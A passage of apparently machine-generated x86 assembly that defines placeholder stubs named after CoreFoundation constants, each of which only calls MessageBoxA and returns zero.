retn
kCFDateFormatterStandaloneQuarterSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterStandaloneQuarterSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterStandaloneWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterStandaloneWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterTimeZoneKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterTwoDigitStartDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterTwoDigitStartDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortStandaloneMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortStandaloneMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortStandaloneWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortStandaloneWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterVeryShortWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDebugDescriptionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDescriptionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDomainCocoa
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDomainCoreFoundation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDomainMach
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDomainOSStatus
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorDomainPOSIX
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorFilePathKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorLocalizedDescriptionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorLocalizedFailureReasonKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorLocalizedRecoverySuggestionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorURLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFErrorUnderlyingErrorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFFileURLDirectoryContents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFFileURLExists
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFFileURLLastModificationTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFFileURLPOSIXMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFFileURLSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFGregorianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFHTTPURLStatusCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFHTTPURLStatusLine
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFHebrewCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFISO8601Calendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFIndianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFIslamicCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFIslamicCivilCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFJapaneseCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleAlternateQuotationBeginDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleAlternateQuotationEndDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCalendarIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCalendarIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCalendarKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCollationIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCollationIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCollatorIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCollatorIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCountryCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCountryCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCurrencyCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCurrencyCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCurrencySymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCurrencySymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleCurrentLocaleDidChangeNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleDecimalSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleDecimalSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleExemplarCharacterSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleExemplarCharacterSetKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleGroupingSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleGroupingSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleLanguageCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleLanguageCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleMeasurementSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleMeasurementSystemKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleQuotationBeginDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleQuotationEndDelimiterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleScriptCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleScriptCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleUsesMetricSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleUsesMetricSystemKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleVariantCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFLocaleVariantCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFManagedPreferencesMCXNotificationName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFManagedPreferencesMCXObjectName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNotificationAnyName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNotificationAnyObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNotificationAnyObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNull
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterAlwaysShowDecimalSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterAlwaysShowDecimalSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyCodeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyDecimalSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyDecimalSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyGroupingSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencyGroupingSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencySymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterCurrencySymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterDecimalSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterDecimalSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterDefaultFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterDefaultFormatKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterExponentSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterExponentSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterFormatWidth
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterFormatWidthKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterGroupingSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterGroupingSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterGroupingSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterGroupingSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterInfinitySymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterInfinitySymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterInternationalCurrencySymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterInternationalCurrencySymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterIsLenient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterIsLenientKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxFractionDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxFractionDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxIntegerDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxIntegerDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxSignificantDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMaxSignificantDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinFractionDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinFractionDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinIntegerDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinIntegerDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinSignificantDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinSignificantDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinusSign
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMinusSignKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMultiplier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterMultiplierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNaNSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNaNSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNegativePrefix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNegativePrefixKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNegativeSuffix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterNegativeSuffixKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPaddingCharacter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPaddingCharacterKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPaddingPosition
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPaddingPositionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPerMillSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPerMillSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPercentSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPercentSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPlusSign
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPlusSignKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPositivePrefix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPositivePrefixKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPositiveSuffix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterPositiveSuffixKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterRoundingIncrement
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterRoundingIncrementKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterRoundingMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterRoundingModeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterSecondaryGroupingSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterSecondaryGroupingSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterUseGroupingSeparator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterUseGroupingSeparatorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterUseSignificantDigits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterUseSignificantDigitsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterZeroSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberFormatterZeroSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberNaN
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberNegativeInfinity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFNumberPositiveInfinity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPersianCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPlugInDynamicRegisterFunctionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPlugInDynamicRegistrationKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPlugInFactoriesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPlugInTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPlugInUnloadFunctionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesAnyApplication
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesAnyHost
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesAnyUser
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesCurrentApplication
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesCurrentHost
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesCurrentUser
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesDidChangeNotificationName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFPreferencesDidChangeObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFRepublicOfChinaCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFRunLoopCommonModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFRunLoopDefaultMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketCommandKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketErrorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketRegisterCommand
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketResultKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketRetrieveCommand
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFSocketValueKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertyAppendToFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertyDataWritten
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertyFileCurrentOffset
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertySocketNativeHandle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertySocketRemoteHostName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStreamPropertySocketRemotePortNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringBinaryHeapCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringFormatLocaleKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringFormatSpecTypeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringFormatValueTypeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringGenderRuleType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringLocalizedFormatKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringPluralRuleType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformFullwidthHalfwidth
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
